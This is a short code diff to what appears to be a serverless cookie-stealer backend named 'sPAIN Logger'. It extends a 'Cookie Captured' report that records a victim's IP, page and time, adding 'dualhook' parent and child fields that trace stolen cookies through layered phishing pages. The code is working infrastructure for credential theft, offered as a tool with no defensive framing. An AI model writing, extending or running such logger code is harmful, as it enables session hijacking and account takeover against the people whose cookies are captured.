@@ -149,9 +149,13 @@ export default async function handler(req, res) {
         title:     '🍪 Cookie Captured',
         color:     0xc026d3,
         fields: [
-          { name: '🌐 IP',   value: `\`${ip}\``, inline: true  },
-          { name: '📄 Page', value: pName,        inline: true  },
-          { name: '🕐 Time', value: now,          inline: false }
+          { name: '🌐 IP',         value: `\`${ip}\``,                                                    inline: true  },
+          { name: '📄 Page',       value: pName,                                                           inline: true  },
+          ...(record.dualhookParent ? [
+            { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``,                                inline: true  },
+            { name: '🔗 DH Child',  value: `\`${slug}\``,                                                 inline: true  },
+          ] : []),
+          { name: '🕐 Time',       value: now,                                                             inline: false }
         ],
         footer:    { text: `sPAIN Logger • ${pName}` },
         timestamp: now
